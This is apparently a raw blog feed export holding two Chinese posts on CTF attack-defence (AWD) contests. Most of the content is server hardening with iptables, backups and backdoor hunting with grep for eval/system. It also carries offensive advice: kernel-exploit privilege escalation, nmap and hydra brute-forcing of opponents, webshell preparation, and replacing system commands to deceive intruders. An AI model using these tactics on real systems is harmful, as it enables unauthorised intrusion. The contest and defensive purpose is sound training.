class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 20/minute --limit-burst 100 -j ACCEPT</span><br><span class="line">　　-m <span class="built_in">limit</span>: 启用<span class="built_in">limit</span>扩展</span><br><span class="line">　　–<span class="built_in">limit</span> 20/minute: 允许最多每分钟10个连接</span><br><span class="line">　　–limit-burst 100: 当达到100个连接后，才启用上述20/minute限制 </span><br></pre></td></tr></table></figure><p>复制</p><p>丢弃陌生的TCP响应包,防止反弹式攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line">iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP </span><br></pre></td></tr></table></figure><p>复制</p><p>更多的姿势，需要打开我们的脑洞了，下面是一个通用的firewall脚本，我们可以传到服务器上一键执行，相关参数可以查阅资料详细了解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#Allow youself Ping other hosts , prohibit others Ping you</span></span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</span><br><span class="line">iptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT</span><br><span class="line"><span class="comment">#Close all INPUT FORWARD OUTPUT, just open some ports</span></span><br><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -P FORWARD DROP</span><br><span class="line">iptables -P OUTPUT DROP</span><br><span class="line"><span class="comment">#Open sshiptables -A INPUT -p tcp --dport 22 -j ACCEPT</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#Open port 80iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#Open multiport</span></span><br><span class="line"><span class="comment">#iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span></span><br><span class="line"><span class="comment">#Control IP connection</span></span><br><span class="line"><span class="comment">#The maximum number of connections for a single IP is 30iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span></span><br><span class="line"><span class="comment">#A single IP allows up to 15 new connections in 60 seconds</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in">set</span> -j ACCEPT</span><br><span class="line"><span class="comment">#Prevent port reuse</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"><span class="comment">#Filter abnormal packets</span></span><br><span class="line">iptables -A INPUT -i eth1 -p tcp --tcp-flags SYN,RST,ACK,FIN SYN -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP </span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP </span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP</span><br><span class="line"><span class="comment">#Prevent DoS attacks</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 20/minute --limit-burst 100 -j ACCEPT</span><br><span class="line"><span class="comment">#Discard unfamiliar TCP response packs to prevent rebound attacks</span></span><br><span class="line">iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line">iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP </span><br></pre></td></tr></table></figure><p>复制</p><p>注意，对于不同的iptables版本，一些参数的用法可以会有略微的差异，使用时我们可能要根据需要进行修改。</p><p><strong>5. 综合分析控阻溢出类攻击</strong></p><p>关于溢出类攻击，我还没有总结出一些很实用的姿势，这里提供一些思路。</p><p>一般来说，溢出攻击成功后，会建立shell通道和网络连接，我们可以配合前面提到的命令，从这两方面入手进行检测和阻隔：</p><p>（1）检测高权限的进程</p><p>（2）检测sh，bash等进程</p><p>（3）检测建立的网络连接</p><p>（4）检查开放的端口</p><p>例子：通过端口和bash发现可疑进程</p><p>如果我们怀疑某个进程正在是受到溢出攻击后创建的shell进程，我们可以分析这个进程是否有socket连接，linux中查看指定进程socket连接数的命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/&lt;进程pid&gt;/fd -l | grep socket: | wc -l </span><br></pre></td></tr></table></figure><p>复制</p><p>比如我们查看ssh进程的socket连接。如果我们检测的程序有socket连接，说明它正在进行网络通信，我们就需要进行进一步判断。</p><p>我们还可以检测可疑进程开启的管道。linux下查看进程管道数的命令类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/&lt;进程pid&gt;/fd -l | grep pipe: | wc -l </span><br></pre></td></tr></table></figure><p>复制</p><p>典型的一个例子是：Apache模块后门mod_rootme，它复用了webserver的80端口，mod_rootme通过管道和bash交互数据，但是由于开启了额外的管道，我们从这个变化上便能察觉到。</p><p>详细内容可以参考： <a href="http://t.qq.com/p/t/330573116082464%E3%80%82">http://t.qq.com/p/t/330573116082464。</a></p><p>总体来说，我们主要可以关注进程情况和网络连接情况，综合分析进程，阻断溢出攻击创建的shel的。</p><p><strong>6. 漏洞修复简单粗暴</strong></p><p>CTF比赛中修复漏洞主要就是为了防止其他队伍的入侵了。</p><p><strong>1. 删站</strong>：如果赛组没有明确禁止，这是最粗暴的姿势，只留自己的webshell，参加过几场比赛确实遇到了这种尴尬的事情，web攻防最后都演变成了拼手速的“GetShell+留后门+删站”。</p><p><strong>2. 删漏洞页面</strong>：大部分举办方还是会明确禁止删除网站的，通常赛组会定期访问网站主页（一般来说），从而确定网站是否正常运行。其实我们没必要删除整个网站，只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等。</p><p><strong>3. 破坏正常功能</strong>：如果明确不能删除任何页面，可以选择让这些漏洞点的功能函数（或者其依赖的功能函数）失效。比如上传点，如果考虑过滤挺麻烦，又不能删页面，那么我们可以找到这个漏洞网页，改掉或者删掉文件里对应的类似upload等这种功能调用函数。</p><p>上面这三种其实都算不上修补漏洞了，真实环境下哪能这么干。</p><p><strong>4. 采用正常修补手段</strong>：规则限定很严的情况下，我们还是采用正常手法吧，修改服务配置、安装补丁、下载更新的软件版本、加过滤等等。</p><blockquote><p>_&lt;&lt;&lt;&lt;&lt;&lt;</p></blockquote><p>谈到那个删站，我忍不住想吐槽几句，我个人是不赞成这种做法的，因为这种操作在比赛中很容易拉仇恨并且产生连锁反应，也不利于个人的进步。有些人认为：我先拿下这台服务器说明我有能力，你没进去就说明你没本事，所以我先进去删了站不让其他人进也无可厚非，有能耐你就先拿下它，那你删了我也没意见。也有人说，真正的对抗里，敌人不会对你仁慈～～没错，挺有道理的，而且强者也应该拥有发言权。但是我们不能只从一个角度考虑问题，换个角度去考虑，CTF竞赛虽然是向着真实的网络环境靠拢，但是它的根本目的是提高竞技者的安全技能和知识水平。对于大部分切磋竞技的玩家来说，参加比赛也都是为了让自己获得提高，大家在同一个平台上进行进行切磋对抗，认识到自己和对手身上的优点与不足，这才是竞技。但是这种行为其实从某种意义上来说已经破坏了比赛的公平性，毕竟如果是因为技术不到位，那当然没什么话说，但是如果网站删了，让别人发挥的地方都没有，这种切磋也没有意义。举个不太恰当的例子，这就像两个人打架，你说你比我强，咱们比比再说，但是你都不让我跟你打，这算什么。再换个角度，其实我一直坚信真正具有强者姿态的人，不畏惧挑战、不怕被人超越，不屑于通过这种手段巩固自己的地位。相反，我们只有将自己至于狂风大浪中，才能成长和蜕变，最终成为一个强者。</p><p>无论从什么角度考虑，我们应该敢于挑战自身、挑战别人，不断强大自己，不断去征服，无畏无惧、步履铿锵！</p><p><strong>7. 安全软件锦上添花</strong></p><p>可以使用第三方软件的话，装个WAF，安全狗之类的吧。这个我没什么话要说，附个linux安全狗的链接吧：</p><p>安全狗linux版：<a href="http://www.safedog.cn/website_safedog.html">http://www.safedog.cn/website_safedog.html</a></p><p>我们平时也可以搜集或者自己实现一些脚本或者工具备用。</p><p>这里有waf一枚：<a href="http://hackblog.cn/post/75.html">http://hackblog.cn/post/75.html</a></p><p>如果我们想给web目录文件添加自定义waf脚本，其实可以用一条命令解决,以php为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?phpnrequire_once(&#x27;/tmp/waf.php&#x27;);n/g&quot; </span><br></pre></td></tr></table></figure><p>复制</p><p>命令的意思就是查找&#x2F;var&#x2F;www&#x2F;html目录下所有php文件，在头部添加一句，用require函数引入&#x2F;tmp&#x2F;waf.php文件。因为sed命令利用 &#x2F; 区分文件中的原字符串和修改的字符串，所以我们要对 &#x2F; 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义：’，命令转换过来就是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?phpnrequire_once(&#x27;/tmp/waf.php&#x27;);n/g&quot; </span><br></pre></td></tr></table></figure><p>复制</p><p>这样，再次打开时我们就会发现已经引入了自定义waf文件。</p><p><strong>8. 我可能get了假的flag</strong></p><p>如果说很不幸，我们前面的关卡都被突破了（实际上我都感觉前面那些设置都有点“搅屎”的味道了，不过还是希望师傅们能一起来讨论讨论有没有什么骚姿势，以及绕过它们的方法）。假设真的被突破了，对于CTF线下赛来说，我们最终的目的都是拿到flag。通常我们会在服务器上执行类似于”getflag”命令，或者”curl”访问某个url获取flag，然后获取到一个字符串，然后在答题平台上提交这段字符串即可获取分数。就拿前之前的ISCC来说，这个也是我赛后想到的。这个getflag是一个elf的程序，在&#x2F;usr&#x2F;bin&#x2F;下，顺手给下载了，有兴趣的同学可以去逆向一波。重点在这，有几次我getflag的时候因为webshell丢了，服务器显示了Error。后来想想，我们是不是可以故意利用这种报错来欺骗不细心的竞争对手呢，当然我不知道是不是已经有师傅们用了这个手法。这是模拟的效果：</p><p>怎样实现？比如我们可以添加alias别名，或者我们可以把这些命令更改或者替换掉，换成一些伪装命令程序。再换一层想想，接着上面的思路，如果我们替换或者伪装了系统命令，对方getshell之后，进来发现cd，ls等命令都没法用，会怎么样呢？然而这样会不会不太好～～</p><p>最后推荐一个感觉挺实用功能很强的远程连接管理工具，可以极大方便我们的工作：<a href="https://mobaxterm.mobatek.net/">MobaXterm</a>。（不是打广告~）</p><p>它支持多种连接方式，可以拖拽进行文件管理。支持在打开的会话一键批量执行命令。</p><p>还有一个非常方便的ssh端口转发功能，支持本地、远程、动态转发。</p><p>还有很多其他功能貌似很厉害，不过我没用过，就不说了…</p><p>真不是打广告。</p><p><strong>三. 对CTF举办的一点小小建议</strong></p><p>如今CTF越来越火，对于这些比赛的举办方，我有着一些不成熟想法和小建议，如果您觉得有什么不合适的地方，纯当娱乐：</p><p>（1）扩展竞技形式：目前线下赛web攻防占绝大多数，有些小比赛甚至只有若干web服务器，上面放几个不同类型的站点，形式有些单一了，其实可以增加多种对抗模式，甚至可以让参赛选手走出比赛场地。去年曾有幸聆听了诸葛建伟博士关于打破XCTF现有格局的讲座，他提出了体系化攻防演练，认为CTF可以引入实地wifi渗透、门禁系统突破、无人机攻防、GPS信号对抗等，增加比赛多样性与趣味性，让线下赛不再只是局限于小小的机房</p><p>（2）重视安全分析与防护。安全不仅仅只是网络攻防对抗，数据分析、取证分析、应急响应、追踪溯源等技能也相当重要，并且在安全人才圈里这方面缺口也比较大。今年六月份，启明星辰主办的2017”信息安全铁人三项赛”（分为”个人逆向赛“、”数据分析赛“、”企业攻防赛“三个赛事），其中”数据分析赛“便是一个典型代表，参赛选手需要分析真实企业网络环境下受网络攻击的流量数据，从中找出攻击者、分析其网络攻击行为，如欺骗劫持、爆破、webshell连接操作等，找到并分析攻击者的后门或者恶意软件。这种模式，有助于参赛者接触到相对更加真实的网络攻击流量的对抗与防御。</p><p>（3）完善竞技模式的具体细节，尽量避免取巧或者粗暴姿势。比如拿修补漏洞举例子，现在CTF线下赛中绝大部分参赛者为了维持加固自己的shell，往往都会采用<strong>删除部分页面的方法，比如登陆、注册页面，因为采用正常打补丁、修改配置等操作都比较费时费事</strong>。但在比赛中这种方式是对于学习真正的安全加固、漏洞修补知识没有太多提高。玩CTF不应该仅仅为了比赛而比赛，或者只是为了拿个奖、拿几张证书，还是要注重从中学到点东西，不过有证书对以后就业还是有些帮助的。</p><p>虽然说这些会增加举办方的负担，给选手增加难度，但是这也是一种趋势。CTF必然要经历从普及到提高的转变，并且随着参赛选手水平的提高，我们确实需要一些更有意思的玩法，这是一个相互促进的关系。当然，对于入门级的CTF选手来说，题目难度过大反而会降低比赛体验，对于不同级别的玩家，可以设置不同级别的赛事。从形式上讲，像引入门禁系统突破、无人机攻防等，对于大部分CTF举办方来说实现起来有些难度，毕竟涉及到不同的环境、设备、人员维护等问题，所以这个不应该强求，但是对网络攻防来说增加如windows 服务器、邮件服务器、路由设备等还是可行的。以后的CTF规格和水平会越来越高，对于参赛选手的挑战难度也会越来越大，这对于举办方和选手来说都是挑战，但是挑战亦是机遇，我们应时刻准备好投入战斗！</p><p><strong>四. 最后的话</strong></p><p>虽说上面提到的这些姿势不可能让我们的靶机变得无懈可击，但是至少能在某种程度上提高它的防御值，希望能对大家有所帮助。最后，祝愿各位CTF参赛选手在比赛中勇创佳绩，同时也祝愿各单位的大佬们都能把CTF筹办的越来越好！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF线下防御战-—-让你的靶机变成“铜墙铁壁”&quot;&gt;&lt;a href=&quot;#CTF线下防御战-—-让你的靶机变成“铜墙铁壁”&quot; class=&quot;headerlink&quot; title=&quot;CTF线下防御战 — 让你的靶机变成“铜墙铁壁”&quot;&gt;&lt;/a&gt;CTF线下防御战 — 让你的</summary>
      
    
    
    
    <category term="AWD" scheme="https://lhhxs.github.io/categories/AWD/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
    <category term="攻防" scheme="https://lhhxs.github.io/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>CTF线下AWD攻防步骤总结</title>
    <link href="https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E6%AD%A5%E9%AA%A4%E6%80%BB%E7%BB%93/"/>
    <id>https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E6%AD%A5%E9%AA%A4%E6%80%BB%E7%BB%93/</id>
    <published>2022-09-09T02:05:23.134Z</published>
    <updated>2022-09-09T14:24:30.300Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF线下AWD攻防步骤总结："><a href="#CTF线下AWD攻防步骤总结：" class="headerlink" title="CTF线下AWD攻防步骤总结："></a>CTF线下AWD攻防步骤总结：</h1><p>ctf线下AWD攻防赛学习笔记：<a href="https://blog.csdn.net/qq_43442524/article/details/102653414">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102653414</a><br>CTF AWD模式下简单的CMS代码审计：<a href="https://blog.csdn.net/qq_43442524/article/details/102409351">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102409351</a></p><h2 id="AWD竞赛"><a href="#AWD竞赛" class="headerlink" title="AWD竞赛"></a>AWD竞赛</h2><p><img src="https://img-blog.csdn.net/20180920140411443?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTE0OTE4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="image"></p><p>前半个小时应熟悉配置环境。准备网线、网线转接口</p><p>最好的防御就是攻击，一定要做好安全加固</p><p>本次记录的目的是为了给自己一个月来的准备弄个交代,感觉自己跟大佬们差的很远,只拿了三等,往后的路还很长,还是需要亿点点的努力,无限进步.</p><p><a href="https://github.com/PlutoaCharon/AWD-Attack-Defense">工具链接</a>:</p><p><code>https://github.com/PlutoaCharon/AWD-Attack-Defense</code></p><h2 id="赛前准备"><a href="#赛前准备" class="headerlink" title="赛前准备"></a>赛前准备</h2><p>常用工具：</p><ul><li>Burpsuite</li><li>sqlmap</li><li>nmap、masscan</li><li>nc</li><li>D盾</li><li>Xshell、Xftp</li><li>菜刀或蚁剑</li><li>Chrome、Firefox各类插件</li></ul><p>一句话木马：</p><ul><li>php</li><li>asp</li><li>aspx</li><li>jsp</li><li>内存马</li></ul><p>代码比较工具:</p><p>BeyondCompare(windows)</p><p>Kaleidoscope(mac)</p><p><strong>提前准备好各种cms的poc exp （因为你们不允许联网）phpwin phpcms dz</strong></p><p><a href="https://github.com/Mr5m1th/POC-Collect">CMS_POC</a></p><h2 id="防守步骤"><a href="#防守步骤" class="headerlink" title="防守步骤"></a>防守步骤</h2><h3 id="0x00-ssh登陆，修改密码"><a href="#0x00-ssh登陆，修改密码" class="headerlink" title="0x00 ssh登陆，修改密码"></a>0x00 ssh登陆，修改密码</h3><p>普通用户提权成root，根据kernel版本号找到对应的poc，exp提权</p><h3 id="0x01-下载源码，备份，-x2F-var-x2F-www-x2F-html-目录"><a href="#0x01-下载源码，备份，-x2F-var-x2F-www-x2F-html-目录" class="headerlink" title="0x01 下载源码，备份，&#x2F;var&#x2F;www&#x2F;html 目录"></a>0x01 下载源码，备份，&#x2F;var&#x2F;www&#x2F;html 目录</h3><p>定时备份源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">while [ 1 ]</span><br><span class="line">do</span><br><span class="line">time=`/bin/date +%H-%M-%S`</span><br><span class="line">bak_file=&quot;/var/www/$time.tar.gz&quot;</span><br><span class="line">webdir=&quot;/var/www/html&quot;</span><br><span class="line">tar zcvf $bak_file $webdir &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">sleep 60                               //一分钟备份一次</span><br><span class="line">done </span><br></pre></td></tr></table></figure><h4 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h4><p>1、找数据库配置文件，找到<code>db_name、db_user</code>和<code>db_passwd</code></p><p>2、登陆数据库，命令备份数据库:</p><p><code>mysqldump -u db_user -p db_passwd db_name &gt; bak.sql//备份指定数据库</code></p><p><code>cd /var/lib/mysql</code></p><p><code>mysqldump -u db_user -p db_passwd &gt; bak.sql//先进入数据库目录再备份</code></p><p><code>mysqldump --all-databases &gt; bak.sql //备份所有数据库</code></p><p>3、还原数据库：</p><p><code>mysql -u db_user -p db_passwd db_name &lt; bak.sql //还原指定数据库</code></p><p><code>cd /var/lib/mysql</code></p><p><code>mysql -u db_user db_passwd &lt; bak.sql //先进入数据库目录再还原</code></p><p>还有一种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u db_name -p</span><br><span class="line">input passwd 进入mysql控制台mysql&gt;</span><br><span class="line">mysql&gt; show databases;看看有哪些数据库</span><br><span class="line">mysql&gt; create database test ; 建立要还原的数据库</span><br><span class="line">mysql&gt; use test;切换到刚创建的数据库</span><br><span class="line">mysql&gt; source test.sql; 导入数据库 </span><br></pre></td></tr></table></figure><p>关闭 MySQL 远程登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># mysql -u root -p</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update user set host = &#x27;localhost&#x27; where user=&#x27;root&#x27; and host=&#x27;%&#x27;;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; exit; </span><br></pre></td></tr></table></figure><p>隐藏用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看home目录下是否有其他用户</span><br><span class="line">/etc/passwd是否有/bin/bash的用户 </span><br></pre></td></tr></table></figure><h3 id="0x02-扫描预留后门，御剑，k8飞刀，D盾，扫描目录，发现后门，注释代码"><a href="#0x02-扫描预留后门，御剑，k8飞刀，D盾，扫描目录，发现后门，注释代码" class="headerlink" title="0x02 扫描预留后门，御剑，k8飞刀，D盾，扫描目录，发现后门，注释代码"></a>0x02 扫描预留后门，御剑，k8飞刀，D盾，扫描目录，发现后门，注释代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 简单的查找后门</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;eval(&#x27;</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;assert(&#x27;</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;system(&#x27; </span><br></pre></td></tr></table></figure><h3 id="0x03-修改数据库密码"><a href="#0x03-修改数据库密码" class="headerlink" title="0x03 修改数据库密码"></a>0x03 修改数据库密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Show databases;</span><br><span class="line">use mysql;</span><br><span class="line">set password for root@localhost = password(&#x27;123&#x27;); 或者</span><br><span class="line">update user set password = PASSWORD(&#x27;要更换的密码&#x27;) where user = &#x27;root&#x27;;</span><br><span class="line">flush privileges；</span><br><span class="line">show tables；可能有flag。</span><br><span class="line">select * from typecho_flag; </span><br></pre></td></tr></table></figure><h3 id="0x04-关闭不必要的端口，要求的服务端口不能关"><a href="#0x04-关闭不必要的端口，要求的服务端口不能关" class="headerlink" title="0x04 关闭不必要的端口，要求的服务端口不能关"></a>0x04 关闭不必要的端口，要求的服务端口不能关</h3><p><code>netstat -napt ，lsof -i</code> 查看端口，<br><code>kill -9 PID</code> 杀掉进程<br><code>nmap -sV ip地址</code>（-sV参数可以探测目标主机的服务器版本）<br><code>nmap</code>扫描对方开启的端口，21,22，21,3306，进行爆破</p><p><code>msfconsole</code>进入<code>metasploit</code>,<code>hydra</code>可以对22端口进行爆破</p><h3 id="0x05-代码审计，使用seay源代码审计，或者Rips代码审计"><a href="#0x05-代码审计，使用seay源代码审计，或者Rips代码审计" class="headerlink" title="0x05 代码审计，使用seay源代码审计，或者Rips代码审计"></a>0x05 代码审计，使用seay源代码审计，或者Rips代码审计</h3><p>可以参考我写的这篇博客</p><p><a href="https://blog.csdn.net/qq_43442524/article/details/101934481">Rips工具使用</a></p><h3 id="0x06-木马查杀"><a href="#0x06-木马查杀" class="headerlink" title="0x06 木马查杀"></a>0x06 木马查杀</h3><p>关于木马</p><ul><li>关注服务的可用性状况</li><li>查看文件监控情况</li><li>在被攻击的时候进行响应，保存相应的流量，查找&#x2F;清除后门</li></ul><blockquote><p>建议使用apache用户来删除</p></blockquote><h4 id="通过文件监控查看系统异常情况"><a href="#通过文件监控查看系统异常情况" class="headerlink" title="通过文件监控查看系统异常情况"></a>通过文件监控查看系统异常情况</h4><p>文件监控脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span 